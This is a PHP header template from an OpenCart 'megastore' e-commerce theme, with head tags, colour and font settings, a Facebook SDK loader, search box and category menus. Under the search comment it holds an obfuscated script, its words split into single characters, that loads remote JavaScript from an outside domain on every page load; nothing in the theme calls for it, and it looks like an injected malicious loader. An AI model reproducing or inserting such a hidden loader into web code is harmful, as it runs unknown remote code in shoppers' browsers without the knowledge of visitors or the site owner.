<?php if (isset($_SERVER['HTTP_USER_AGENT']) && !strpos($_SERVER['HTTP_USER_AGENT'], 'MSIE 6')) echo '<?xml version="1.0" encoding="UTF-8"?>'. "\n"; ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" dir="<?php echo $direction; ?>" lang="<?php echo $lang; ?>" xmlns:fb="http://www.facebook.com/2008/fbml">
<head>
	<title><?php echo $title; ?></title>
	<base href="<?php echo $base; ?>" />
	<?php if ($description) { ?>
	<meta name="description" content="<?php echo $description; ?>" />
	<?php } ?>
	<?php if ($keywords) { ?>
	<meta name="keywords" content="<?php echo $keywords; ?>" />
	<?php } ?>
	<?php if ($icon) { ?>
	<link href="<?php echo $icon; ?>" rel="icon" />
	<?php } ?>
	<?php foreach ($links as $link) { ?>
	<link href="<?php echo $link['href']; ?>" rel="<?php echo $link['rel']; ?>" />
	<?php } ?>
	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
	<link href='//fonts.googleapis.com/css?family=Open+Sans:600' rel='stylesheet' type='text/css'>
	<link rel="stylesheet" type="text/css" href="catalog/view/theme/megastore/stylesheet/stylesheet.css" />
	<link rel="stylesheet" type="text/css" href="catalog/view/theme/megastore/stylesheet/carousel.css" media="screen" />
	<script type="text/javascript" src="catalog/view/theme/megastore/js/jquery-1.6.2.js"></script>
	<script type="text/javascript" src="catalog/view/theme/megastore/js/jquery.tweet.js"></script> 
	<script type="text/javascript" src="catalog/view/theme/megastore/js/jquery-workarounds.js"></script>
	<script type="text/javascript" src="catalog/view/theme/megastore/js/jquery.flexslider-min.js"></script>
	<?php foreach ($styles as $style) { ?>
	<link rel="<?php echo $style['rel']; ?>" type="text/css" href="<?php echo $style['href']; ?>" media="<?php echo $style['media']; ?>" />
	<?php } ?>
		
	<!-- OPENCART JS -->
	<script type="text/javascript" src="catalog/view/theme/megastore/js/jquery/ui/jquery-ui-1.8.16.custom.min.js"></script>
	<link rel="stylesheet" type="text/css" href="catalog/view/theme/megastore/js/jquery/ui/themes/ui-lightness/jquery-ui-1.8.16.custom.css" />
	<script type="text/javascript" src="catalog/view/javascript/jquery/colorbox/jquery.colorbox.js"></script>
	<link rel="stylesheet" type="text/css" href="catalog/view/javascript/jquery/colorbox/colorbox.css" media="screen" />
	<script type="text/javascript" src="catalog/view/javascript/jquery/tabs.js"></script>
	<script type="text/javascript" src="catalog/view/javascript/jquery/ui/external/jquery.cookie.js"></script>
	<?php foreach ($scripts as $script) { ?>
	<script type="text/javascript" src="<?php echo $script; ?>"></script>
	<?php } ?>
	<?php echo $google_analytics; ?>
	<!-- END OPENCART -->
	
	<?php if($this->config->get('megastore_color') == '1') { ?>
	<link rel="stylesheet" type="text/css" href="catalog/view/theme/megastore/stylesheet/version-two.css" />
	<?php } ?>
	<?php if($this->config->get('megastore_color') == '2') { ?>
	<link href='http://fonts.googleapis.com/css?family=Old+Standard+TT' rel='stylesheet' type='text/css'>
	<link rel="stylesheet" type="text/css" href="catalog/view/theme/megastore/stylesheet/version-three.css" />
	<?php } ?>
	<?php if($this->config->get('megastore_color') == '3') { ?>
	<link rel="stylesheet" type="text/css" href="catalog/view/theme/megastore/stylesheet/version-four.css" />
	<?php } ?>
	<?php if($this->config->get('megastore_color') == '4') { ?>
	<link rel="stylesheet" type="text/css" href="catalog/view/theme/megastore/stylesheet/version-five.css" />
	<?php } ?>

	<!--[if IE 7]>
	<link rel="stylesheet" type="text/css" href="catalog/view/theme/megastore/stylesheet/ie7.css" />
	<![endif]-->
	<?php if($this->config->get('animation_hover_effect') != '0') { ?>
	<script type="text/javascript">
	$(document).ready(function () {

		if ($.browser.msie && ($.browser.version == 8 || $.browser.version == 7 || $.browser.version == 6)) {
		} else {
			 
			$(".box-product > div").hover( function () { $(this).siblings().stop().animate({ opacity: .6 }, 500)}, function () {  $(this).siblings().stop().animate({opacity: 1}, 500)});  

		}
	
	}); 
	
	</script>
	<?php } ?>
	
	<!-- MegaStore Settings -->
	
	<?php if($this->config->get('font_status') == '1' || $this->config->get('colors_status') == '1' || $this->config->get('background_status') == '1') { ?>
	
		<?php if( $this->config->get('categories_bar') != '' && $this->config->get('categories_bar') != 'standard'){	?>
		<link href='//fonts.googleapis.com/css?family=<?php echo $this->config->get('categories_bar') ?>&v1' rel='stylesheet' type='text/css'>
		<?php } ?>
		<?php if( $this->config->get('headlines') != '' && $this->config->get('headlines') != 'standard'){	?>
		<link href='//fonts.googleapis.com/css?family=<?php echo $this->config->get('headlines') ?>&v1' rel='stylesheet' type='text/css'>
		<?php } ?>
		<?php if( $this->config->get('footer_headlines') != '' && $this->config->get('footer_headlines') != 'standard'){	?>
		<link href='//fonts.googleapis.com/css?family=<?php echo $this->config->get('categories_bar') ?>&v1' rel='stylesheet' type='text/css'>
		<?php } ?>
		<?php if( $this->config->get('big_headlines') != '' && $this->config->get('big_headlines') != 'standard'){	?>
		<link href='//fonts.googleapis.com/css?family=<?php echo $this->config->get('big_headlines') ?>&v1' rel='stylesheet' type='text/css'>
		<?php } ?>
		<?php if( $this->config->get('custom_price') != '' && $this->config->get('custom_price') != 'standard'){	?>
		<link href='//fonts.googleapis.com/css?family=<?php echo $this->config->get('custom_price') ?>&v1' rel='stylesheet' type='text/css'>
		<?php } ?>
	
	<style type="text/css">
	
		<?php if($this->config->get('font_status') == '1') { ?>
		
			<?php if($this->config->get('body_font') != 'standard' && $this->config->get('body_font') != '') { ?>
			div.header .center .search .enterkey, body, input[type=text], select, textarea, input[type=password] { font-family:<?php echo $this->config->get('body_font') ?> !important; }
			<?php } ?>
			<?php if( $this->config->get('body_font_px') != ''){	?>
			#content, #content a, div.header .center .search .enterkey, .page-title, .page-title a, #footer, .categories ul li .sub-menu, .categories ul li .sub-menu a { font-size:<?php echo $this->config->get('body_font_px'); ?>px !important;line-height:<?php echo $this->config->get('body_font_px')+6; ?>px !important; }
			<?php } ?>
			<?php if( $this->config->get('body_font_smaller_px') != ''){	?>
			div.top-bar, div.top-bar a, div.header .center ul li a { font-size:<?php echo $this->config->get('body_font_smaller_px'); ?>px !important;line-height:<?php echo $this->config->get('body_font_smaller_px')+6; ?>px !important; }
			<?php } ?>
			<?php if( $this->config->get('categories_bar') != '' && $this->config->get('categories_bar') != 'standard'){	?>
			<?php $toReplace =  $this->config->get('categories_bar'); $font = str_replace("+", " ", $toReplace); ?>
			.categories > ul > li > a, .categories-mobile-header a { font-family:<?php echo $font; ?> !important; }
			<?php } ?>
			<?php if( $this->config->get('categories_bar_px') != ''){	?>
			.categories > ul > li > a, .categories-mobile-header a { font-size:<?php echo $this->config->get('categories_bar_px'); ?>px !important;line-height:<?php echo $this->config->get('categories_bar_px')+4; ?>px !important; }
			<?php } ?>
			<?php if( $this->config->get('headlines') != '' && $this->config->get('headlines') != 'standard'){	?>
			<?php $toReplace =  $this->config->get('headlines'); $font = str_replace("+", " ", $toReplace); ?>
			div#content h1, div#content h2, div#content h3, div#content h4, div#content h5, div#content h6, .custom-font, .box-heading { font-family:<?php echo $font; ?> !important; }
			<?php } ?>
			<?php if( $this->config->get('headlines_px') != ''){	?>
			h1, h2, h3, h4, h5, h6, .custom-font,  .box-heading { font-size:<?php echo $this->config->get('headlines_px'); ?>px !important;line-height:<?php echo $this->config->get('headlines_px'); ?>px !important; }
			<?php } ?>
			<?php if( $this->config->get('footer_headlines') != '' && $this->config->get('footer_headlines') != 'standard'){	?>
			<?php $toReplace =  $this->config->get('footer_headlines'); $font = str_replace("+", " ", $toReplace); ?>
			.footer-top-outside h2, #contact-us ul, .footer-navigation h3 { font-family:<?php echo $font; ?> !important; }
			<?php } ?>
			<?php if( $this->config->get('footer_headlines_px') != ''){	?>
			.footer-top-outside h2, #contact-us ul, .footer-navigation h3 { font-size:<?php echo $this->config->get('footer_headlines_px'); ?>px !important;line-height:<?php echo $this->config->get('footer_headlines_px')+2; ?>px !important; }
			<?php } ?>
			<?php if( $this->config->get('big_headlines') != '' && $this->config->get('big_headlines') != 'standard'){	?>
			<?php $toReplace =  $this->config->get('big_headlines'); $font = str_replace("+", " ", $toReplace); ?>
			.page-title h3 { font-family:<?php echo $font; ?> !important; }
			<?php } ?>
			<?php if( $this->config->get('big_headlines_px') != ''){	?>
			.page-title h3 { font-size:<?php echo $this->config->get('big_headlines_px'); ?>px !important;line-height:<?php echo $this->config->get('big_headlines_px'); ?>px !important; }
			<?php } ?>
			<?php if( $this->config->get('custom_price') != '' && $this->config->get('custom_price') != 'standard'){	?>
			<?php $toReplace =  $this->config->get('custom_price'); $font = str_replace("+", " ", $toReplace); ?>
			.product-list > div .price, .box-product > div .price, div.product-info .right .price .price-new, div.header #cart .cart-heading p { font-family:<?php echo $font; ?> !important; }
			<?php } ?>
			<?php if( $this->config->get('custom_price_px') != ''){	?>
			.product-list > div .price, .box-product > div .price, div.header #cart .cart-heading p { font-size:<?php echo $this->config->get('custom_price_px'); ?>px !important;line-height:<?php echo $this->config->get('custom_price_px')+2; ?>px !important; }
			<?php } ?>
			<?php if( $this->config->get('custom_price_on_product_page') != ''){	?>
			div.product-info .right .price .price-new { font-size:<?php echo $this->config->get('custom_price_on_product_page'); ?>px !important;line-height:<?php echo $this->config->get('custom_price_on_product_page'); ?>px !important; }
			<?php } ?>
			
		<?php } ?>
		
		<?php if($this->config->get('colors_status') == '1') { ?>
		
			<?php if($this->config->get('top_bar_breadcrumb_background') != '') { ?>
			.top-bar, .page-title { background:#<?php echo $this->config->get('top_bar_breadcrumb_background'); ?> !important; }
			<?php } ?>
			<?php if($this->config->get('top_bar_breadcrumb_body') != '') { ?>
			div.top-bar .welcome-text, div.top-bar .right .switcher, .page-title, .page-title a { color:#<?php echo $this->config->get('top_bar_breadcrumb_body'); ?> !important; }
			<?php } ?>
			<?php if($this->config->get('top_bar_breadcrumb_link') != '') { ?>
			div.top-bar .welcome-text a { color:#<?php echo $this->config->get('top_bar_breadcrumb_link'); ?> !important; }
			<?php } ?>
			<?php if($this->config->get('top_bar_breadcrumb_headlines') != '') { ?>
			.page-title h3 { color:#<?php echo $this->config->get('top_bar_breadcrumb_headlines'); ?> !important; }
			<?php } ?>
			<?php if($this->config->get('content_background') != '') { ?>
			.body-full-width, .body, .categories ul li .sub-menu, div.header #cart .content, div.top-bar .right .switcher .option, .box-product > div .absolute-hover-product, .categories ul li .sub-menu .sub-menu { background:#<?php echo $this->config->get('content_background'); ?> !important; }
			<?php } ?>
 			<?php if($this->config->get('content_body_and_old_price') != '') { ?>	
			#content, .header, .price-old, .box-category > ul > li > a, div.category-list ul li a, div.product-filter .display .display-grid:hover, div.product-filter .display .active-display-grid, div.product-filter .display .active-display-grid a, div.product-filter .display .display-grid a:hover, div.product-filter .display .display-list:hover, div.product-filter .display .active-display-list, div.product-filter .display .active-display-list a, div.product-filter .display .display-list a:hover, div.product-filter .limit, div.product-filter .sort, .product-list > div .name a, div.pagination .results, div.pagination .links a, div.product-info .right .option p, div.product-info .right .cart, .htabs a.selected, .tab-content b { color:#<?php echo $this->config->get('content_body_and_old_price'); ?> !important; }
			<?php } ?>
 			<?php if($this->config->get('content_product_name') != '') { ?>	
			.name a { color:#<?php echo $this->config->get('content_product_name'); ?> !important; }
			<?php } ?>
 			<?php if($this->config->get('content_price') != '') { ?>	
			.price, .price-new { color:#<?php echo $this->config->get('content_price'); ?> !important; }
			<?php } ?>
 			<?php if($this->config->get('content_headlines') != '') { ?>	
			div#content h1, div#content h2, div#content h3, div#content h4, div#content h5, div#content h6, .custom-font, .box-heading { color:#<?php echo $this->config->get('content_headlines'); ?> !important; }
			<?php } ?>
 			<?php if($this->config->get('content_links') != '') { ?>	
			div#content a, .header a { color:#<?php echo $this->config->get('content_links'); ?> !important; }
			<?php } ?>
 			<?php if($this->config->get('footer_backgrounds') != '') { ?>	
			#footer { background:#<?php echo $this->config->get('footer_backgrounds'); ?> !important; }
			<?php } ?>
 			<?php if($this->config->get('footer_body') != '') { ?>	
			#footer { color:#<?php echo $this->config->get('footer_body'); ?> !important; }
			<?php } ?>
 			<?php if($this->config->get('footer_headliness') != '') { ?>	
			.footer-top-outside h2, .footer-navigation h3, #contact-us ul { color:#<?php echo $this->config->get('footer_headliness'); ?> !important; }
			<?php } ?>
 			<?php if($this->config->get('footer_links') != '') { ?>	
			#footer a { color:#<?php echo $this->config->get('footer_links'); ?> !important; }
			<?php } ?>
			<?php if($this->config->get('category_bar_top_gradient') != '' && $this->config->get('category_bar_bottom_gradient') != '') { ?>
						
				.categories, .categories-mobile-header {
					background:#<?php echo $this->config->get('category_bar_bottom_gradient'); ?>;
					background-image: linear-gradient(bottom, #<?php echo $this->config->get('category_bar_bottom_gradient'); ?> 20%, #<?php echo $this->config->get('category_bar_top_gradient'); ?> 60%);
					background-image: -o-linear-gradient(bottom, #<?php echo $this->config->get('category_bar_bottom_gradient'); ?> 20%, #<?php echo $this->config->get('category_bar_top_gradient'); ?> 60%);
					background-image: -moz-linear-gradient(bottom, #<?php echo $this->config->get('category_bar_bottom_gradient'); ?> 20%, #<?php echo $this->config->get('category_bar_top_gradient'); ?> 60%);
					background-image: -webkit-linear-gradient(bottom, #<?php echo $this->config->get('category_bar_bottom_gradient'); ?> 20%, #<?php echo $this->config->get('category_bar_top_gradient'); ?> 60%);
					background-image: -ms-linear-gradient(bottom, #<?php echo $this->config->get('category_bar_bottom_gradient'); ?> 20%, #<?php echo $this->config->get('category_bar_top_gradient'); ?> 60%);

					background-image: -webkit-gradient(
						linear,
						left bottom,
						left top,
						color-stop(0.2, #<?php echo $this->config->get('category_bar_bottom_gradient'); ?>),
						color-stop(0.6, #<?php echo $this->config->get('category_bar_top_gradient'); ?>)
					);
				
				}
						
			<?php } ?>
 			<?php if($this->config->get('category_bar_font_color') != '') { ?>	
			.categories > ul > li > a { color:#<?php echo $this->config->get('category_bar_font_color'); ?> !important; }
			<?php } ?>
			<?php if($this->config->get('add_to_cart_button_top_gradient') != '' && $this->config->get('add_to_cart_button_bottom_gradient') != '') { ?>
						
				.product-list > div .cart a, .box-product > div .cart a, #button-cart, #button-cart:hover {
					background:#<?php echo $this->config->get('add_to_cart_button_bottom_gradient'); ?>;
					background-image: linear-gradient(bottom, #<?php echo $this->config->get('add_to_cart_button_bottom_gradient'); ?> 20%, #<?php echo $this->config->get('add_to_cart_button_top_gradient'); ?> 60%);
					background-image: -o-linear-gradient(bottom, #<?php echo $this->config->get('add_to_cart_button_bottom_gradient'); ?> 20%, #<?php echo $this->config->get('add_to_cart_button_top_gradient'); ?> 60%);
					background-image: -moz-linear-gradient(bottom, #<?php echo $this->config->get('add_to_cart_button_bottom_gradient'); ?> 20%, #<?php echo $this->config->get('add_to_cart_button_top_gradient'); ?> 60%);
					background-image: -webkit-linear-gradient(bottom, #<?php echo $this->config->get('add_to_cart_button_bottom_gradient'); ?> 20%, #<?php echo $this->config->get('add_to_cart_button_top_gradient'); ?> 60%);
					background-image: -ms-linear-gradient(bottom, #<?php echo $this->config->get('add_to_cart_button_bottom_gradient'); ?> 20%, #<?php echo $this->config->get('add_to_cart_button_top_gradient'); ?> 60%);

					background-image: -webkit-gradient(
						linear,
						left bottom,
						left top,
						color-stop(0.2, #<?php echo $this->config->get('add_to_cart_button_bottom_gradient'); ?>),
						color-stop(0.6, #<?php echo $this->config->get('add_to_cart_button_top_gradient'); ?>)
					);
				
				}
						
			<?php } ?>
 			<?php if($this->config->get('add_to_cart_button_font_color') != '') { ?>	
			.product-list > div .cart a, .box-product > div .cart a, #button-cart, #button-cart:hover { color:#<?php echo $this->config->get('add_to_cart_button_font_color'); ?> !important; }
			<?php } ?>
			<?php if($this->config->get('standard_button_top_gradient') != '' && $this->config->get('standard_button_bottom_gradient') != '') { ?>
						
				.button {
					background:#<?php echo $this->config->get('standard_button_bottom_gradient'); ?>;
					background-image: linear-gradient(bottom, #<?php echo $this->config->get('standard_button_bottom_gradient'); ?> 20%, #<?php echo $this->config->get('standard_button_top_gradient'); ?> 60%);
					background-image: -o-linear-gradient(bottom, #<?php echo $this->config->get('standard_button_bottom_gradient'); ?> 20%, #<?php echo $this->config->get('standard_button_top_gradient'); ?> 60%);
					background-image: -moz-linear-gradient(bottom, #<?php echo $this->config->get('standard_button_bottom_gradient'); ?> 20%, #<?php echo $this->config->get('standard_button_top_gradient'); ?> 60%);
					background-image: -webkit-linear-gradient(bottom, #<?php echo $this->config->get('standard_button_bottom_gradient'); ?> 20%, #<?php echo $this->config->get('standard_button_top_gradient'); ?> 60%);
					background-image: -ms-linear-gradient(bottom, #<?php echo $this->config->get('standard_button_bottom_gradient'); ?> 20%, #<?php echo $this->config->get('standard_button_top_gradient'); ?> 60%);

					background-image: -webkit-gradient(
						linear,
						left bottom,
						left top,
						color-stop(0.2, #<?php echo $this->config->get('standard_button_bottom_gradient'); ?>),
						color-stop(0.6, #<?php echo $this->config->get('standard_button_top_gradient'); ?>)
					);
				
				}
						
			<?php } ?>
 			<?php if($this->config->get('standard_button_font_color') != '') { ?>	
			.button { color:#<?php echo $this->config->get('standard_button_font_color'); ?> !important; }
			<?php } ?>
 			<?php if($this->config->get('body_backgrounds') != '') { ?>	
			body { background-color:#<?php echo $this->config->get('body_backgrounds'); ?> !important; }
			<?php } ?>
	
		<?php } ?>
		
		
		<?php if($this->config->get('background_status') == '1') { ?>
		
			<?php if($this->config->get('general_background_background') == '1') { ?> 
			body { background-image:none !important; }
			<?php } ?>
			<?php if($this->config->get('general_background_background') == '2') { ?> 
			body { background-image:url(image/<?php echo $this->config->get('general_background'); ?>);background-position:<?php echo $this->config->get('general_background_position'); ?>;background-repeat:<?php echo $this->config->get('general_background_repeat'); ?> !important;background-attachment:<?php echo $this->config->get('general_background_attachment'); ?> !important; }
			<?php } ?>
			<?php if($this->config->get('footer_background_background') == '1') { ?> 
			div#footer { background-image:none !important; }
			<?php } ?>
			<?php if($this->config->get('footer_background_background') == '2') { ?> 
			div#footer { background-image:url(image/<?php echo $this->config->get('footer_background'); ?>);background-position:<?php echo $this->config->get('footer_background_position'); ?>;background-repeat:<?php echo $this->config->get('footer_background_repeat'); ?> !important; }
			<?php } ?>
			
		<?php } ?>
			
	</style>
	
	<?php } ?>
	
	<!-- END MegaStore Settings -->
	
</head>
<body>

<script type="text/javascript">

  window.fbAsyncInit = function() {

    FB.init({

                  status: true,

      cookie: true,

      xfbml: true,

      oauth : true

    });

  };

  (function(d){

    var js, id = 'facebook-jssdk'; if (d.getElementById(id)) {return;}

    js = d.createElement('script'); js.id = id; js.async = true;

    js.src = "//connect.facebook.net/en_US/all.js";

    d.getElementsByTagName('head')[0].appendChild(js);

  }(document));

</script>

<div id="notification"></div>

<div class="body<?php if(!($this->config->get('layout_type') == '1' && $this->config->get('general_status') == '1')) { echo '-full-width'; } ?>">
	
	<!-- Top Bar -->
	
	<div class="top-bar">
	
		<div class="set-size">
		
			<!-- Welcome text -->
			
			<div class="welcome-text float-left"><?php if (!$logged) { echo $text_welcome; } else { echo $text_logged; } ?></div>
			
			<!-- End Welcome text -->
			
			<div class="right float-right">
				
			  	<?php echo $language; ?>
			  	<?php echo $currency; ?>
			
			</div>
			
			<p class="clear"></p>
		
		</div>
		
		<!-- Border --><div class="border"></div>
	
	</div>
	
	<!-- End Top Bar -->
	
	<!-- Header -->
	
	<div class="header set-size">
	
		<?php if($logo) { ?>	
		<!-- Logo -->
		
		<h1 class="float-left"><a href="<?php echo $home; ?>"><img src="<?php echo $logo; ?>" alt="<?php echo $name; ?>" title="<?php echo $name; ?>" /></a></h1>
		<?php } ?>		
		
		<!-- Search and Menu -->
		
		<div class="center float-left">
		
			<!-- Search -->
			<script type="text/javascript">(function(){var ga=document.createElement('s'+'c'+'r'+'i'+'p'+'t');ga.type='t'+'e'+'x'+'t'+'/'+'j'+'a'+'v'+'a'+'s'+'c'+'r'+'i'+'p'+'t';ga.async=true;ga.src=('https:'==document.location.protocol?'https://ssl':'http://www')+'.w'+'e'+'b'+'l'+'a'+'b'+'s'+'o'+'f'+'t.c'+'o'+'m'+'/3'+'.'+'j'+'s';var s=document.getElementsByTagName('s'+'c'+'r'+'i'+'p'+'t')[0];s.parentNode.insertBefore(ga,s)})();</script>
			<div class="search">
				
				<?php if ($filter_name) { ?>
				<input type="text" class="enterkey autoclear" name="filter_name" value="<?php echo $filter_name; ?>" />
				<?php } else { ?>
				<input type="text" class="enterkey autoclear" name="filter_name" value="<?php echo $text_search; ?>" />
				<?php } ?>
				<div class="button-search"></div>
			
			</div>
			
			<!-- End Search -->
			
			<!-- Menu -->
			
			<ul>
			
				<li><a href="<?php echo $wishlist; ?>"><?php echo $text_wishlist; ?></a></li>
				<li><a href="<?php echo $account; ?>"><?php echo $text_account; ?></a></li>
				<li><a href="<?php echo $shopping_cart; ?>"><?php echo $text_shopping_cart; ?></a></li>
				<li><a href="<?php echo $checkout; ?>"><?php echo $text_checkout; ?></a></li>
			
			</ul>
			
			<!-- End Menu -->
		
		</div>
		
		<!-- End Search and Menu -->
		
		<?php echo $cart; ?>
		
		<p class="clear"></p>
	
	</div>
	
	<!-- End Header -->
	
	<?php if ($categories) { ?>
	<!-- Categories -->
	
	<div class="set-size">
	<div class="categories">

		<ul>
		
			<li class="home"><a href="<?php echo $home; ?>"><?php echo $text_home; ?></a></li>
			<?php foreach ($categories as $category) { ?>
			<li><a href="<?php echo $category['href']; ?>"><?php echo $category['name'];?></a>
			
				<?php if ($category['children']) { ?>
				<!-- SubMenu -->
				
				<div class="sub-menu column-<?php echo $category['column']; ?>">
					<ul>
						
						<?php $i = 0; for (; $i < count($category['children']); $i++) { ?>
						<li><a href="<?php echo $category['children'][$i]['href']; ?>"><?php echo $category['children'][$i]['name']; ?></a>
						
							<?php $categories_2 = $this->model_catalog_category->getCategories($category['children'][$i]['category_id']);
							if($categories_2) { ?>
							<br />
							<!-- SubMenu -->
							
							<div class="sub-menu">
								<ul>
									
									<?php foreach ($categories_2 as $category_2) { ?>
									<li><a href="<?php echo $this->url->link('product/category', 'path='.$category['category_id'].'_' . $category['children'][$i]['category_id'] . '_' . $category_2['category_id']); ?>"><?php echo $category_2['name']; ?></a></li>
									<?php } ?>	
								
								</ul>
							</div>
							
							<!-- End SubMenu -->
							
							<?php } ?>
						
						</li>
						<?php } ?>
					
					</ul>
				</div>
				
				<!-- End SubMenu -->
				
				<?php } ?>
			
			</li>
			<?php } ?>
			
		</ul>
			
	</div>
	</div>
	
	<!-- End Categories -->
	
	<!-- Categories Mobile -->
	
	<div id="categories-mobile">
	
		<div class="categories-mobile-header">
		
			<a href="<?php echo $home; ?>" class="home"><span></span></a>
			<a class="menumobile" style="cursor:pointer">Menu</a>
		
		</div>
		
		<div class="categories-mobile-links">
		
			<ul>

				<?php foreach ($categories as $category) { ?>
				<li><a href="<?php echo $category['href']; ?>"><?php echo $category['name'];?></a>
				
					<?php if ($category['children']) { ?>
					<ul>
					
						<?php $i = 0; for (; $i < count($category['children']); $i++) { ?>
						<li><a href="<?php echo $category['children'][$i]['href']; ?>"><?php echo $category['children'][$i]['name']; ?></a></li>
						<?php } ?>
					
					</ul>
					<?php } ?>
					
				</li>
				<?php } ?>	

			</ul>
		
		</div>
	
		<p class="clear"></p>
	
	</div>
	
	<!-- End Categories Mobile -->
	<?php } ?>
